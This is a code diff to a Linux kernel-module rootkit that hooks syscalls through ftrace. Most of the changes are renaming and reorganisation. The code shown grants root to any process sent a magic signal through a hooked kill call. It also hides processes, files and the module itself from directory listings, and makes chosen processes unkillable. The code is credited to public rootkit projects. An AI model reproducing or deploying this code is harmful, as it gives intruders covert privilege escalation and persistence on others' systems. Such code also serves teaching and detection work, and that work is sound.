@@ -68,16 +68,15 @@ MODULE_VERSION("0.2");
 //======================================================================================================================
 
 //***************************************************** Definitions ****************************************************
-// Codes for signals that are given to syscalls to do *special* things
-// In hooked sys_kill
-#define SIGSUPER    64      // make a process root
+// Codes for signals that are given to sys_kill to do *special* things
+#define SIGROOT     64      // make a process root
 #define SIGUSER     63      // make a process user mode
-#define SIGINVIS    62      // make a process invisible
-#define SIGVISBL    61      // make a process visible
-#define SIGIMORT    60      // make a process immortal
-#define SIGMORTL    59      // make a process mortal
-#define SIGHIDEM    58      // hide the kernel module
-#define SIGUNHDM    57      // unhide the kernel module
+#define SIGINVS     62      // make a process invisible
+#define SIGVSBL     61      // make a process visible
+#define SIGIMRT     60      // make a process immortal
+#define SIGMRTL     59      // make a process mortal
+#define SIGHDMD     58      // hide the kernel module
+#define SIGUNHM     57      // unhide the kernel module
 #define SIGTOGF     56      // toggle hidden files
 
 // for hiding files using group / user ids
@@ -87,8 +86,8 @@ MODULE_VERSION("0.2");
 #define GROUP_HIDE  21
 
 // max number of hidden files / immortal processes at once
-#define MAX_HIDDEN_FILES 256
-#define MAX_IMMORTAL_PIDS 256
+#define MAX_HIDDEN_FILES    256
+#define MAX_IMMORTAL_PIDS   256
 //======================================================================================================================
 
 //************************************ Check correct architecture and kernel version ***********************************
@@ -124,7 +123,7 @@ static inline void disable_write_protection(void) {
 
 //*************************************************** Util functions ***************************************************
 // These utils are taken from https://github.com/croemheld/lkm-rootkit/tree/master
-static struct data_node {
+struct data_node {
 	/* pointer to data */
 	void *data;
 	/* list to previous and next entry */
@@ -168,7 +167,7 @@ static struct data_node *find_data_node_field(struct data_node **head, void *nee
 }
 //======================================================================================================================
 
-//***************************************** Functions for privilage escalation *****************************************
+//***************************************** Functions for privilege escalation *****************************************
 // A lot of these functions were adapted from https://github.com/croemheld/lkm-rootkit/tree/master
 struct task_struct *real_init;
 struct data_node *creds = NULL;
@@ -329,7 +328,7 @@ static ptregs_t orig_openat;
 //************************************** Definitions and array for holding hooks ***************************************
 /* Note: The following hooking mechanism utilising ftrace was used heavily from the ftrace-hook project - see:
 https://github.com/ilammy/ftrace-hook */
-static struct ftrace_hook {
+struct ftrace_hook {
     const char *name;
     void *function;
     void *original;
@@ -345,13 +344,6 @@ static struct ftrace_hook {
 		.function = (_function),			\
 		.original = (_original),			\
 	}
-
-#define HOOK_NOSYS(_name, _function, _original)	\
-{											\
-    .name = (_name),						\
-    .function = (_function),				\
-    .original = (_original),				\
-}
 
 // a global variable to store our hooked syscall structs
 static struct ftrace_hook hooks[] = {
@@ -457,10 +449,10 @@ static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
 //======================================================================================================================
 
 //**************************************************** Hiding files ****************************************************
-static int hidingFiles = 1;
+static int hiding_files = 1;
 
 static void toggle_file_visibility(void) {
-    hidingFiles = !hidingFiles;
+    hiding_files = !hiding_files;
 }
 
 static char *hidden_files[MAX_HIDDEN_FILES] = {
@@ -509,7 +501,7 @@ static int should_hide_file(const char *filename) {
 
 // helper function for hooked getdents64 syscall to hide any files / dirs we want hidden
 // This is adapted from: https://github.com/ait-aecid/caraxes/
-static int __always_inline hide_files_and_dirs(struct linux_dirent __user * dirent, int res, int fd) {
+static __always_inline int hide_files_and_dirs(struct linux_dirent __user * dirent, int res, int fd) {
 	int err;
 	unsigned long off = 0;
 	struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
@@ -534,7 +526,7 @@ static int __always_inline hide_files_and_dirs(struct linux_dirent __user * dire
 		if (err) goto out;
 		user = (int)stat->uid.val;
 		group = (int)stat->gid.val;
-        if (hidingFiles && (should_hide_file(kdir->d_name) || group == GROUP_HIDE || user == USER_HIDE)) {
+        if (hiding_files && (should_hide_file(kdir->d_name) || group == GROUP_HIDE || user == USER_HIDE)) {
             printk(KERN_INFO "rootkit: hooked getdents to block %s\n", kdir->d_name);
 			if (kdir == kdirent) {
 				res -= kdir->d_reclen;
@@ -557,24 +549,24 @@ static int __always_inline hide_files_and_dirs(struct linux_dirent __user * dire
 }
 
 // Can call this from inside hooked sys_getdents64 to hide files
-static void make_file_hidden(const char *path) {
-    struct path file_path;
-    struct inode *inode;
-    int ret = kern_path(path, LOOKUP_FOLLOW, &file_path);
-    if (ret) return;
+// static void make_file_hidden(const char *path) {
+//     struct path file_path;
+//     struct inode *inode;
+//     int ret = kern_path(path, LOOKUP_FOLLOW, &file_path);
+//     if (ret) return;
 
-    inode = file_path.dentry->d_inode;
+//     inode = file_path.dentry->d_inode;
 
-    inode_lock(inode);
+//     inode_lock(inode);
 
-    inode->i_gid = make_kgid(&init_user_ns, GROUP_HIDE);
-    inode->i_uid = make_kuid(&init_user_ns, USER_HIDE);
+//     inode->i_gid = make_kgid(&init_user_ns, GROUP_HIDE);
+//     inode->i_uid = make_kuid(&init_user_ns, USER_HIDE);
 
-    mark_inode_dirty(inode);
-    inode_unlock(inode);
+//     mark_inode_dirty(inode);
+//     inode_unlock(inode);
 
-    path_put(&file_path);
-}
+//     path_put(&file_path);
+// }
 //======================================================================================================================
 
 //************************************************** Hiding processes **************************************************
@@ -617,7 +609,7 @@ static int isImmortal(int pid) {
     return 0;
 }
 
-static void makeImmortal(int pid) {
+static void make_immortal(int pid) {
     if (isImmortal(pid)) return;
 
     if (numImmortalPids < MAX_IMMORTAL_PIDS) {
@@ -625,7 +617,7 @@ static void makeImmortal(int pid) {
     }
 }
 
-static void makeMortal(int pid) {
+static void make_mortal(int pid) {
     for (int i = 0; i < numImmortalPids; i++) {
         if (immortalPids[i] == pid) {
             for (int j = i; j < numImmortalPids - 1; j++) {
@@ -668,55 +660,63 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
     int pid = regs->di;
     int sig = regs->si;
 
-    if (isImmortal(pid) && sig != SIGMORTL) {
+    if (sig < SIGTOGF && isImmortal(pid)) {
         printk(KERN_INFO "rootkit: immortal process: pid = %d cannot be killed\n", pid);
         return 0;
     }
 
-    if (sig == SIGSUPER) {
-        printk(KERN_INFO "rootkit: SIGSUPER received - make process with pid = %d root\n", pid);
-        process_escalate(pid);
-        return 0;
-    } else if (sig == SIGUSER) {
-        printk(KERN_INFO "rootkit: SIGUSER received - make process with pid = %d user\n", pid);
-        process_deescalate(pid);
-        return 0;
-    } else if (sig == SIGINVIS) {
-        printk(KERN_INFO "rootkit: SIGINVIS received - hide process with pid = %d\n", pid);
-        process_hide(pid);
-        return 0;
-    } else if (sig == SIGVISBL) {
-        printk(KERN_INFO "rootkit: SIGVISBL received - unhide process with pid = %d\n", pid);
-        process_unhide(pid);
-        return 0;
-    } else if (sig == SIGIMORT) {
-        printk(KERN_INFO "rootkit: SIGIMORT received - process with pid = %d should now be immortal\n", pid);
-        makeImmortal(pid);
-        return 0;
-    } else if (sig == SIGMORTL) {
-        printk(KERN_INFO "rootkit: SIGMORTL received - process with pid = %d should now be mortal\n", pid);
-        makeMortal(pid);
-        return 0;
-    } else if (sig == SIGHIDEM) {
-        if (!isHidden) {
-            printk(KERN_INFO "rootkit: SIGHIDEM received - hiding kernel module\n");
-            hide_module();
-        }
-        return 0;
-    } else if (sig == SIGUNHDM) {
-        if (isHidden) {
-            printk(KERN_INFO "rootkit: SIGUNHDM received - unhiding kernel module\n");
-            unhide_module();
-        }
-        return 0;
-    } else if (sig == SIGTOGF) {
-        toggle_file_visibility();
-        printk(KERN_INFO "rootkit: SIGTOGF received - toggling files to be %d (0 = visible, 1 = hidden)\n", hidingFiles);
-        return 0;
-    }
+    switch (sig) {
+        case SIGROOT:
+            printk(KERN_INFO "rootkit: SIGROOT received - make process with pid = %d root\n", pid);
+            process_escalate(pid);
+            return 0;
 
-    return orig_kill(regs);
+        case SIGUSER:
+            printk(KERN_INFO "rootkit: SIGUSER received - make process with pid = %d user\n", pid);
+            process_deescalate(pid);
+            return 0;
+
+        case SIGINVS:
+            printk(KERN_INFO "rootkit: SIGINVS received - hide process with pid = %d\n", pid);
+            process_hide(pid);
+            return 0;
+
+        case SIGVSBL:
+            printk(KERN_INFO "rootkit: SIGVSBL received - unhide process with pid = %d\n", pid);
+            process_unhide(pid);
+            return 0;
+
+        case SIGIMRT:
+            printk(KERN_INFO "rootkit: SIGIMRT received - process with pid = %d should now be immortal\n", pid);
+            make_immortal(pid);
+            return 0;
+
+        case SIGMRTL:
+            printk(KERN_INFO "rootkit: SIGMRTL received - process with pid = %d should now be mortal\n", pid);
+            make_mortal(pid);
+            return 0;
+
+        case SIGHDMD:
+            printk(KERN_INFO "rootkit: SIGHDMD received - hiding kernel module\n");
+            hide_module();
+            return 0;
+
+        case SIGUNHM:
+            printk(KERN_INFO "rootkit: SIGUNHM received - unhiding kernel module\n");
+            unhide_module();
+            return 0;
+
+        case SIGTOGF:
+            printk(KERN_INFO "rootkit: SIGTOGF received - toggling files to be %d (0 = visible, 1 = hidden)\n",
+                !hiding_files);
+            toggle_file_visibility();
+            return 0;
+
+        default:
+            return orig_kill(regs);
+    }
 }
+
 
 // Hooks the getdents64 syscall, which is used to read directory entries from an open directory
 // We can hook this syscall to not display files or directories which we want to hide
